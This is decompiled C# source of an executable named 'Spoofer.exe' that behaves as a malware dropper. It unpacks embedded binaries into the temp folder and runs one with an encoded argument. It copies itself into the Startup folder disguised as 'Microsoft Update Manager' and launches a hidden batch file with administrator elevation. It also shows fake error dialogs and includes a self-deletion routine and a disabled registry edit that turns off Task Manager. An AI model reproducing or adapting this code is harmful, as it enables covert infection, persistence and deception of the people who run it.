// Decompiled with JetBrains decompiler
// Type: hexify
// Assembly: Obfuscated Name, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F586F40D-E7E7-42DC-83B9-A3609E437F40
// Assembly location: C:\Users\User0\OneDrive\Skrivebord\Spoofer.exe

using idk;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

public class hexify
{
  public static string sad = (string) null;

  public static bool IsFileinUse(FileInfo file)
  {
    FileStream fileStream = (FileStream) null;
    try
    {
      fileStream = file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None);
    }
    catch (IOException ex)
    {
      return true;
    }
    finally
    {
      fileStream?.Close();
    }
    return false;
  }

  public static void Main()
  {
    vCk_resource.vC();
    if (!vCk_resource.vCk)
    {
      string tempPath = Path.GetTempPath();
      try
      {
        foreach (string manifestResourceName in Assembly.GetExecutingAssembly().GetManifestResourceNames())
          hexify.resources(manifestResourceName);
        string arguments = "ZhXl39BlhP84+Y4kurA8wpehxxqA0X22IMYZ6Vpiqs5H+ql5Xs2s4yAxo1YY5Lu1cSvcaVq26wy78vNpTvKDZ1ZiOFkpkYfR7qXYHtWtV9AJh3NHqVFTy7tX5KBPWYbzUR3D+aEMv2xFAIUk+LEhWLCNi9g6PXPauoaHUJVt13U=";
        Process.Start(tempPath + "RtkBtManServ.exe", arguments);
        try
        {
          File.Delete(tempPath + "CustomEXE.ext");
        }
        catch
        {
          string str = "Cstm" + new Random().Next(1, 9999999).ToString();
          while (!File.Exists(tempPath + str))
            str = "Cstm" + new Random().Next(1, 9999999).ToString();
        }
      }
      catch (Exception ex)
      {
        int num1 = (int) MessageBox.Show(ex.Message);
        if (ex.Message.Contains("RtkBtManServ.exe"))
        {
          do
            ;
          while (hexify.IsFileinUse(new FileInfo(tempPath + "RtkBtManServ.exe")));
          hexify.Main();
        }
        int num2 = (int) MessageBox.Show("An unknown error occured while trying to execute\n.NET Framework 4.6.1 or above might not be installed.", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        Environment.Exit(0);
      }
      hexify.av();
      if (true)
        return;
      do
        ;
      while (File.Exists(tempPath + "RtkBtManServ.exe") | hexify.IsFileinUse(new FileInfo(tempPath + "RtkBtManServ.exe")));
    }
    else
    {
      int num = (int) MessageBox.Show("The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.", Application.ExecutablePath, MessageBoxButtons.OK, MessageBoxIcon.Hand);
      Environment.Exit(0);
    }
  }

  public static void RemoveEXE() => Process.Start(new ProcessStartInfo()
  {
    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
    WindowStyle = ProcessWindowStyle.Hidden,
    CreateNoWindow = true,
    FileName = "cmd.exe"
  });

  public static void resources(string resource)
  {
    string str1 = resource.Replace("Properties.Resources.resources", (string) null);
    if (hexify.sad == null)
    {
      hexify.sad = str1;
    }
    else
    {
      string str2 = resource.Replace(hexify.sad + "Binaries.", "");
      if (File.Exists(Path.GetTempPath() + str2))
        File.Delete(Path.GetTempPath() + str2);
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource);
      FileStream fileStream = new FileStream(Path.GetTempPath() + str2, FileMode.CreateNew);
      for (int index = 0; (long) index < manifestResourceStream.Length; ++index)
        fileStream.WriteByte((byte) manifestResourceStream.ReadByte());
      fileStream.Close();
    }
  }

  public static void av()
  {
    Random random = new Random();
    int minValue = random.Next(0, 10000000);
    while (true)
    {
      if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft Update Manager" + (object) minValue + ".exe"))
      {
        int num;
        minValue = random.Next(minValue, num = minValue + 1034);
      }
      else
        break;
    }
    File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft Update Manager" + (object) minValue + ".exe");
    try
    {
      File.Move(Path.GetTempPath() + "whysosad", Path.GetTempPath() + "dav.bat");
      if (false)
      {
        string contents = File.ReadAllText(Path.GetTempPath() + "dav.bat").Replace("rem gg", "REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
        File.WriteAllText(Path.GetTempPath() + "dav.bat", contents);
      }
      Process.Start(new ProcessStartInfo()
      {
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        WorkingDirectory = Path.GetTempPath(),
        FileName = "dav.bat",
        Verb = "runas"
      });
    }
    catch
    {
      int num1 = (int) MessageBox.Show("Adminstrator permissons are required to continue. Please try again", "", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      try
      {
        Process.Start(new ProcessStartInfo()
        {
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = true,
          WorkingDirectory = Path.GetTempPath(),
          FileName = "dav.bat",
          Verb = "runas"
        });
      }
      catch
      {
        int num2 = (int) MessageBox.Show("Exiting.", "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
    }
  }
}
